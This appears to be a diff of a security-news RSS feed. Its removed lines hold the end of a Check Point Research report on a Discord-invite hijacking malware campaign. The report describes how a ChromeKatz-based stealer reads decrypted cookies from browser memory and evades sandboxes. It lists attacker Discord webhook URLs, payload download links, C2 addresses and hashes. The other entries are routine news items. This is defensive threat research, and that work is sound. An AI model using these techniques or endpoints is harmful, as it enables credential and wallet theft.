-&lt;li&gt;&lt;strong&gt;f08676eeb489087bc0e47bd08a3f7c4b57ef5941698bc09d30857c650763859c&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;Unlike traditional stealers that rely on decrypting cookie files,&amp;nbsp;the ChromeKatz-based stealer operates directly within the browser&amp;#8217;s memory,&amp;nbsp;effectively bypassing ABE and extracting cookies from the latest versions of Google Chrome,&amp;nbsp;Edge,&amp;nbsp;and Brave.&amp;nbsp;The stealer accesses the browser process memory directly,&amp;nbsp;retrieving cookies in their decrypted form.&lt;/p&gt;
-
-
-
-&lt;p&gt;Before initiating cookie collection,&amp;nbsp;the stealer searches for the appropriate browser process&amp;nbsp;(&lt;code&gt;chrome.exe&lt;/code&gt;,&amp;nbsp;&lt;code&gt;msedge.exe&lt;/code&gt;,&amp;nbsp;or&amp;nbsp;&lt;code&gt;brave.exe&lt;/code&gt;)&amp;nbsp;for injection.&amp;nbsp;It enumerates active processes,&amp;nbsp;identifies browser processes,&amp;nbsp;determines the executable path using the&amp;nbsp;&lt;code&gt;K32GetModuleFileNameExW&lt;/code&gt;&amp;nbsp;function,&amp;nbsp;and retrieves the browser version via&amp;nbsp;&lt;code&gt;GetFileVersionInfoW&lt;/code&gt;.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31495" height="135" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-19-Detecting-the-browser-version.png" width="519" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 19&lt;/strong&gt; &amp;#8211; Detecting the browser version.&lt;/p&gt;
-
-
-
-&lt;p&gt;This step is crucial,&amp;nbsp;as ChromeKatz can only operate with specific browser versions where the&amp;nbsp;&lt;code&gt;CookieMap&lt;/code&gt;&amp;nbsp;structure in memory is known.&lt;/p&gt;
-
-
-
-&lt;p&gt;Notably,&amp;nbsp;cookies are stored exclusively in a single child process of the browser,&amp;nbsp;the&amp;nbsp;&lt;code&gt;NetworkService&lt;/code&gt;,&amp;nbsp;responsible for network operations.&amp;nbsp;To locate the correct process,&amp;nbsp;the stealer checks for the following string in the command-line arguments:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;--utility-sub-type=network.mojom.NetworkService
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;The steps in the cookie extraction mechanism:&lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li&gt;The stealer identifies the largest &lt;code&gt;MEM_PRIVATE | PAGE_READWRITE&lt;/code&gt; memory region within the browser&amp;#8217;s memory, presumed to contain the &lt;code&gt;CookieMap&lt;/code&gt; structure.&lt;/li&gt;
-
-
-
-&lt;li&gt;It employs signature-based search with masks (patterns containing &lt;code&gt;0xAA&lt;/code&gt; as wildcards) to locate the start of the structure.&lt;/li&gt;
-
-
-
-&lt;li&gt;The stealer recursively traverses the B-tree representing the in-memory cookie storage structure to extract cookie data.&lt;/li&gt;
-&lt;/ol&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31496" height="455" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-20-Recursive-traversal-of-the-B-tree-storing-cookies-in-browser-memory.png" width="743" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 20&lt;/strong&gt; &amp;#8211; Recursive traversal of the B-tree storing cookies in browser memory.&lt;/p&gt;
-
-
-
-&lt;p&gt;The attackers incorporated string encryption&amp;nbsp;(similar to that used in the downloaders)&amp;nbsp;and a check for the presence of a &amp;nbsp;&lt;strong&gt;settings.txt&lt;/strong&gt;&amp;nbsp;file,&amp;nbsp;which should have been created by the downloader.&amp;nbsp;This simple trick allows the stealer to bypass sandbox environments,&amp;nbsp;as the module exits without initiating malicious activity if run in isolation from the rest of the malware chain.&lt;/p&gt;
-
-
-
-&lt;p&gt;The stolen data is archived into a file &lt;strong&gt;exported_cookies.zip&lt;/strong&gt;,&amp;nbsp;which is then sent to the attackers via a Discord webhook.&lt;/p&gt;
-
-
-
-&lt;p&gt;In the analyzed samples&amp;nbsp;(SHA256:&amp;nbsp;&lt;strong&gt;db1aa52842247fc3e726b339f7f4911491836b0931c322d1d2ab218ac5a4fb08&lt;/strong&gt;,&amp;nbsp;&lt;br /&gt;&lt;strong&gt;f08676eeb489087bc0e47bd08a3f7c4b57ef5941698bc09d30857c650763859c&lt;/strong&gt;),&amp;nbsp;the following webhook URLs were used:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;https://discord[.]com/api/webhooks/1363890376271724785/NiZ1XTpzvw27K9O-0IVn7jM7oVVA_6drg91Wxgtgm78A9xsLoD1e_t-GFLiRBw5Lfv41&lt;/strong&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;https://discord[.]com/api/webhooks/1367077804990009434/jPrMZM5-Rq9LryHdcKRBvsObHHWhNvHnnhPn07yohGYsDdFYadR2YCk4oqnHwXekdDib&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Additional Campaign Targeting Gamers&lt;/h2&gt;
-
-
-
-&lt;p&gt;We also identified another active campaign, operated by the same threat actors,&amp;nbsp;which shares core characteristics with the previously described campaign&amp;nbsp;but employs a different initial infection vector.&amp;nbsp;In this case,&amp;nbsp;the loader is distributed as a Trojanized hacktool for unlocking pirated downloadable content&amp;nbsp;(DLC)&amp;nbsp;in&amp;nbsp;&lt;em&gt;The Sims 4&lt;/em&gt;&amp;nbsp;—&amp;nbsp;specifically targeting that game&amp;#8217;s player base.&lt;/p&gt;
-
-
-
-&lt;p&gt;The malicious archive&amp;nbsp;&lt;strong&gt;Sims4-Unlocker.zip&lt;/strong&gt;&amp;nbsp;(SHA256:&amp;nbsp;&lt;strong&gt;ef8c2f3c36fff5fccad806af47ded1fd53ad3e7ae22673e28e541460ff0db49c&lt;/strong&gt;)&amp;nbsp;is hosted at:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;https://bitbucket[.]org/htfhtthft/simshelper/downloads/Sims4-Unlocker.zip&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;Bitbucket provides download counters,&amp;nbsp;allowing us to see the scope of the campaign.&amp;nbsp;During our monitoring,&amp;nbsp;we observed more than&amp;nbsp;&lt;strong&gt;350 downloads&lt;/strong&gt;&amp;nbsp;of the archive:&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31497" height="286" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-21-Bitbucket-download-count-for-Sims4-Unlocker_zip-1024x286.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 21&lt;/strong&gt; &amp;#8211; Bitbucket download count for Sims4-Unlocker.zip&lt;/p&gt;
-
-
-
-&lt;p&gt;Despite the different entry point and target audience,&amp;nbsp;the same loader framework is used,&amp;nbsp;along with the&amp;nbsp;&lt;strong&gt;Skuld Stealer&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;AsyncRAT&lt;/strong&gt;&amp;nbsp;payloads.&lt;/p&gt;
-
-
-
-&lt;p&gt;Additional related repositories likely linked to past campaigns by the same actors:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;https://bitbucket[.]org/updateservicesvar/serv/downloads/&lt;/strong&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;https://bitbucket[.]org/registryclean1/fefsed/downloads/&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Victims and Impact&lt;/h1&gt;
-
-
-
-&lt;p&gt;Precise identification of victims remains challenging due to the nature of the attack infrastructure.&amp;nbsp;As the Skuld Stealer uses Discord webhooks,&amp;nbsp;a one-way communication method,&amp;nbsp;for exfiltrating stolen data,&amp;nbsp;the attackers receive sensitive information without leaving publicly accessible traces.&amp;nbsp;As a result,&amp;nbsp;direct victim attribution is limited.&lt;/p&gt;
-
-
-
-&lt;p&gt;However,&amp;nbsp;hosting payloads on Bitbucket provides a way to roughly estimate the campaign’s reach based on the download statistics.&amp;nbsp;Across several observed repositories,&amp;nbsp;the number of downloads exceeded 1,300.&amp;nbsp;While not every download necessarily corresponds to a successful infection,&amp;nbsp;this number lets us reasonably approximate the potential victim pool.&lt;/p&gt;
-
-
-
-&lt;p&gt;Based on external telemetry,&amp;nbsp;we determined that victims are distributed across multiple countries,&amp;nbsp;including:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;United States&lt;/li&gt;
-
-
-
-&lt;li&gt;Vietnam&lt;/li&gt;
-
-
-
-&lt;li&gt;France&lt;/li&gt;
-
-
-
-&lt;li&gt;Germany&lt;/li&gt;
-
-
-
-&lt;li&gt;Slovakia&lt;/li&gt;
-
-
-
-&lt;li&gt;Austria&lt;/li&gt;
-
-
-
-&lt;li&gt;Netherlands&lt;/li&gt;
-
-
-
-&lt;li&gt;United Kingdom&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;The choice of payloads,&amp;nbsp;including a powerful stealer specifically targeting cryptocurrency wallets,&amp;nbsp;suggests that the attackers are primarily focused on crypto users and motivated by financial gain.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Conclusion&lt;/h1&gt;
-
-
-
-&lt;p&gt;This campaign illustrates how a subtle feature of Discord&amp;#8217;s invite system,&amp;nbsp;the ability to reuse expired or deleted invite codes in vanity invite links,&amp;nbsp;can be exploited as a powerful attack vector.&amp;nbsp;By hijacking legitimate invite links,&amp;nbsp;threat actors silently redirect unsuspecting users to malicious Discord servers.&lt;/p&gt;
-
-
-
-&lt;p&gt;The attackers constructed a carefully orchestrated,&amp;nbsp;multi-stage infection chain,&amp;nbsp;beginning with social engineering techniques,&amp;nbsp;followed by a PowerShell-based downloader,&amp;nbsp;and employing trusted services like GitHub,&amp;nbsp;Bitbucket,&amp;nbsp;and Pastebin to stealthily host and deliver encrypted malware payloads.&amp;nbsp;Interestingly,&amp;nbsp;instead of employing sophisticated obfuscation or packing techniques,&amp;nbsp;they relied on simpler yet highly effective evasion methods:&amp;nbsp;Altering behavior based on command-line parameters,&amp;nbsp;introducing execution delays through scheduled tasks,&amp;nbsp;and decrypting payloads only after multi-step execution.&lt;/p&gt;
-
-
-
-&lt;p&gt;The selected payloads,&amp;nbsp;specifically AsyncRAT and a customized variant of Skuld Stealer,&amp;nbsp;indicate a financial motivation behind this attack.&amp;nbsp;While Skuld targets credentials from multiple sources&amp;nbsp;such as browsers and Discord,&amp;nbsp;the campaign places particular emphasis on cryptocurrency wallets,&amp;nbsp;notably Exodus and Atomic,&amp;nbsp;by injecting malicious JavaScript that exfiltrates stolen wallet seed phrases and passwords via a dedicated Discord webhook.&amp;nbsp;At the same time,&amp;nbsp;the persistent scheduled task regularly triggers the second-stage loader,&amp;nbsp;ensuring continuous execution and persistence of AsyncRAT.&amp;nbsp;Even if a victim discovers and removes the malware,&amp;nbsp;AsyncRAT will be redownloaded and re-executed,&amp;nbsp;enabling attackers to retain ongoing remote control over previously compromised systems.&lt;/p&gt;
-
-
-
-&lt;p&gt;Discord took swift action to disable the malicious bot used in this campaign, which helps disrupt the current infection chain.&amp;nbsp;However,&amp;nbsp;the broader risk, that&amp;nbsp;attackers could create new bots or adopt alternate delivery methods that leverage the same core techniques, still remains.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Protection&lt;/h1&gt;
-
-
-
-&lt;p&gt;Check Point &lt;a href="https://www.checkpoint.com/infinity/zero-day-protection/"&gt;Threat Emulation&lt;/a&gt; and &lt;a href="https://www.checkpoint.com/harmony/endpoint/"&gt;Harmony Endpoint&lt;/a&gt; provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Indicators of Compromise&lt;/h1&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Hashes&lt;/h2&gt;
-
-
-
-&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;SHA256&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;673090abada8ca47419a5dbc37c5443fe990973613981ce622f30e83683dc932&lt;/td&gt;&lt;td&gt;1st Stage Downloader (RnrLoader)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;160eda7ad14610d93f28b7dee20501028c1a9d4f5dc0437794ccfc2604807693&lt;/td&gt;&lt;td&gt;1st Stage Downloader (RnrLoader newer version)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5d0509f68a9b7c415a726be75a078180e3f02e59866f193b0a99eee8e39c874f&lt;/td&gt;&lt;td&gt;2nd Stage Downloader (RnrLoader)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;375fa2e3e936d05131ee71c5a72d1b703e58ec00ae103bbea552c031d3bfbdbe&lt;/td&gt;&lt;td&gt;PowerShell Script&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;53b65b7c38e3d3fca465c547a8c1acc53c8723877c6884f8c3495ff8ccc94fbe&lt;/td&gt;&lt;td&gt;AsyncRAT payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;d54fa589708546eca500fbeea44363443b86f2617c15c8f7603ff4fb05d494c1&lt;/td&gt;&lt;td&gt;AsyncRAT payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;670be5b8c7fcd6e2920a4929fcaa380b1b0750bfa27336991a483c0c0221236a&lt;/td&gt;&lt;td&gt;AsyncRAT payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;8135f126764592be3df17200f49140bfb546ec1b2c34a153aa509465406cb46c&lt;/td&gt;&lt;td&gt;Skuld Stealer payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;f08676eeb489087bc0e47bd08a3f7c4b57ef5941698bc09d30857c650763859c&lt;/td&gt;&lt;td&gt;ChromeKatz payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;db1aa52842247fc3e726b339f7f4911491836b0931c322d1d2ab218ac5a4fb08&lt;/td&gt;&lt;td&gt;ChromeKatz payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;ef8c2f3c36fff5fccad806af47ded1fd53ad3e7ae22673e28e541460ff0db49c&lt;/td&gt;&lt;td&gt;Sims4-Unlocker.zip&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Network Indicators&lt;/h2&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Phishing Website:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;captchaguard[.]me&lt;/li&gt;
-
-
-
-&lt;li&gt;https://captchaguard[.]me/?key=&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;PowerShell Script:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;https://pastebin[.]com/raw/zW0L2z2M&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Bitbucket repositories:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;https://bitbucket[.]org/updatevak/upd/downloads&lt;/li&gt;
-
-
-
-&lt;li&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads&lt;/li&gt;
-
-
-
-&lt;li&gt;https://bitbucket[.]org/updateservicesvar/serv/downloads&lt;/li&gt;
-
-
-
-&lt;li&gt;https://bitbucket[.]org/registryclean1/fefsed/downloads&lt;/li&gt;
-
-
-
-&lt;li&gt;https://bitbucket[.]org/htfhtthft/simshelper/downloads&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;First stage downloader:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;https://github[.]com/frfs1/update/raw/refs/heads/main/installer.exe&lt;/li&gt;
-
-
-
-&lt;li&gt;https://github[.]com/shisuh/update/raw/refs/heads/main/installer.exe&lt;/li&gt;
-
-
-
-&lt;li&gt;https://github[.]com/gkwdw/wffaw/raw/refs/heads/main/installer.exe&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Second stage downloader:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;https://bitbucket[.]org/updatevak/upd/downloads/Rnr.exe&lt;/li&gt;
-
-
-
-&lt;li&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/Rnr.exe&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Skuld stealer:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;https://bitbucket[.]org/updatevak/upd/downloads/skul.exe&lt;/li&gt;
-
-
-
-&lt;li&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/skul.exe&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;AsyncRAT:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;https://bitbucket[.]org/updatevak/upd/downloads/AClient.exe&lt;/li&gt;
-
-
-
-&lt;li&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/AClient.exe&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;AsyncRat Dead Drop Resolver:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;https://pastebin[.]com/raw/ftknPNF7&lt;/li&gt;
-
-
-
-&lt;li&gt;https://pastebin[.]com/raw/NYpQCL7y&lt;/li&gt;
-
-
-
-&lt;li&gt;https://pastebin[.]com/raw/QdseGsQL&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;AsyncRAT C2:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;101.99.76.120&lt;/li&gt;
-
-
-
-&lt;li&gt;87.120.127.37&lt;/li&gt;
-
-
-
-&lt;li&gt;185.234.247.8&lt;/li&gt;
-
-
-
-&lt;li&gt;microads[.]top&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Skuld Discord Webhooks:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;https://discord[.]com/api/webhooks/1355186248578502736/_RDywh_K6GQKXiM5T05ueXSSjYopg9nY6XFJo1o5Jnz6v9sih59A8p-6HkndI_nOTicO&lt;/li&gt;
-
-
-
-&lt;li&gt;https://discord[.]com/api/webhooks/1348629600560742462/RJgSAE7cYY-1eKMkl5EI-qZMuHaujnRBMVU_8zcIaMKyQi4mCVjc9R0zhDQ7wmPoD7Xp&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/"&gt;From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31476</guid><category>Check Point Research Publications</category><category>Threat Research</category></item><item><title>Is Google Password Manager Safe to Use in 2025?</title><link>https://www.techrepublic.com/article/is-google-password-manager-safe/</link><description>Google Password Manager is a free password management service built into Chrome and Google apps. Learn how it works and how secure it is in this detailed review.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4264691</guid><category>Cloud Security</category><category>Security</category><category>google password manager</category><category>password manager</category></item><item><title>The Impact of Artificial Intelligence on the Cybersecurity Workforce</title><link>https://www.nist.gov/blogs/cybersecurity-insights/impact-artificial-intelligence-cybersecurity-workforce</link><description>The NICE Workforce Framework for Cybersecurity ( NICE Framework) was revised in November 2020 as NIST Special Publication 800-181 rev.1 to enable more effective and rapid updates to the NICE Framework Components, including how the advent of emerging technologies would impact cybersecurity work. NICE has been actively engaging in conversations with: federal departments and agencies; industry; education, training, and certification providers; and international representatives to understand how Artificial Intelligence (AI) might affect the nature of our Nation’s digital work. NICE has also led</description><guid isPermaLink="false">https://www.nist.gov/node/1883806</guid></item><item><title>Celebrating 11 years of Project Galileo’s global impact</title><link>https://blog.cloudflare.com/celebrating-11-years-of-project-galileo-global-impact/</link><description>June 2025 marks the 11th anniversary of Project Galileo, Cloudflare’s effort to protect vulnerable public interest organizations from cyber threats.</description><content:encoded>&lt;p&gt;June 2025 marks the 11th anniversary of &lt;a href="https://www.cloudflare.com/galileo/"&gt;&lt;u&gt;Project Galileo&lt;/u&gt;&lt;/a&gt;, Cloudflare’s initiative to provide free cybersecurity protection to vulnerable organizations working in the public interest around the world. From independent media and human rights groups to community activists, Project Galileo supports those often targeted for their essential work in human rights, civil society, and democracy building.&lt;/p&gt;&lt;p&gt;A lot has changed since we marked the &lt;a href="https://blog.cloudflare.com/pt-br/celebrating-10-years-of-project-galileo/"&gt;&lt;u&gt;10th anniversary&lt;/u&gt;&lt;/a&gt; of Project Galileo. Yet, our commitment remains the same: help ensure that organizations doing critical work in human rights have access to the tools they need to stay online.  We believe that organizations, no matter where they are in the world, deserve reliable, accessible protection to continue their important work without disruption.&lt;/p&gt;&lt;p&gt;For our 11th anniversary, we're excited to share several updates including:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;An interactive &lt;a href="https://radar.cloudflare.com/reports/project-galileo-11th-anniv"&gt;&lt;u&gt;Cloudflare Radar report&lt;/u&gt;&lt;/a&gt; providing insights into the cyber threats faced by at-risk public interest organizations protected under the project. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;An expanded commitment to digital rights in the Asia-Pacific region with two new Project Galileo partners.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/project-galileo-case-studies/"&gt;&lt;u&gt;New stories &lt;/u&gt;&lt;/a&gt;from organizations protected by Project Galileo working on the frontlines of civil society, human rights, and journalism from around the world.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
+&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-71516" height="499" src="https://krebsonsecurity.com/wp-content/uploads/2025/06/safarinotifications.png" width="749" /&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=69927</guid><category>A Little Sunshine</category><category>Ne'er-Do-Well News</category><category>Web Fraud 2.0</category><category>AdsPro</category><category>Aimed Global</category><category>BroPush</category><category>ByteCore AG</category><category>DollyWay</category><category>Doppelganger</category><category>GoDaddy</category><category>Help TDS</category><category>Holacode</category><category>Infoblox</category><category>LosPollos</category><category>Partners House</category><category>Qurium</category><category>Renee Burton</category><category>RexAds</category><category>RichAds</category><category>SkyForge Digital AG</category><category>smartlinks</category><category>Spamshield</category><category>TacoLoco</category><category>Teknology SA</category><category>VexTrio</category><category>wordpress</category></item><item><title>Is Google Password Manager Safe to Use in 2025?</title><link>https://www.techrepublic.com/article/is-google-password-manager-safe/</link><description>Google Password Manager is a free password management service built into Chrome and Google apps. Learn how it works and how secure it is in this detailed review.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4264691</guid><category>Cloud Security</category><category>Security</category><category>google password manager</category><category>password manager</category></item><item><title>The Impact of Artificial Intelligence on the Cybersecurity Workforce</title><link>https://www.nist.gov/blogs/cybersecurity-insights/impact-artificial-intelligence-cybersecurity-workforce</link><description>The NICE Workforce Framework for Cybersecurity ( NICE Framework) was revised in November 2020 as NIST Special Publication 800-181 rev.1 to enable more effective and rapid updates to the NICE Framework Components, including how the advent of emerging technologies would impact cybersecurity work. NICE has been actively engaging in conversations with: federal departments and agencies; industry; education, training, and certification providers; and international representatives to understand how Artificial Intelligence (AI) might affect the nature of our Nation’s digital work. NICE has also led</description><guid isPermaLink="false">https://www.nist.gov/node/1883806</guid></item><item><title>Celebrating 11 years of Project Galileo’s global impact</title><link>https://blog.cloudflare.com/celebrating-11-years-of-project-galileo-global-impact/</link><description>June 2025 marks the 11th anniversary of Project Galileo, Cloudflare’s effort to protect vulnerable public interest organizations from cyber threats.</description><content:encoded>&lt;p&gt;June 2025 marks the 11th anniversary of &lt;a href="https://www.cloudflare.com/galileo/"&gt;&lt;u&gt;Project Galileo&lt;/u&gt;&lt;/a&gt;, Cloudflare’s initiative to provide free cybersecurity protection to vulnerable organizations working in the public interest around the world. From independent media and human rights groups to community activists, Project Galileo supports those often targeted for their essential work in human rights, civil society, and democracy building.&lt;/p&gt;&lt;p&gt;A lot has changed since we marked the &lt;a href="https://blog.cloudflare.com/pt-br/celebrating-10-years-of-project-galileo/"&gt;&lt;u&gt;10th anniversary&lt;/u&gt;&lt;/a&gt; of Project Galileo. Yet, our commitment remains the same: help ensure that organizations doing critical work in human rights have access to the tools they need to stay online.  We believe that organizations, no matter where they are in the world, deserve reliable, accessible protection to continue their important work without disruption.&lt;/p&gt;&lt;p&gt;For our 11th anniversary, we're excited to share several updates including:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;An interactive &lt;a href="https://radar.cloudflare.com/reports/project-galileo-11th-anniv"&gt;&lt;u&gt;Cloudflare Radar report&lt;/u&gt;&lt;/a&gt; providing insights into the cyber threats faced by at-risk public interest organizations protected under the project. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;An expanded commitment to digital rights in the Asia-Pacific region with two new Project Galileo partners.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/project-galileo-case-studies/"&gt;&lt;u&gt;New stories &lt;/u&gt;&lt;/a&gt;from organizations protected by Project Galileo working on the frontlines of civil society, human rights, and journalism from around the world.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
           &lt;figure&gt;
           &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3xVNGtdTOw6NXqSfzU7Up1/8a2cbe643108fa97a4d14af477a6cb80/image3.png" /&gt;
           &lt;/figure&gt;
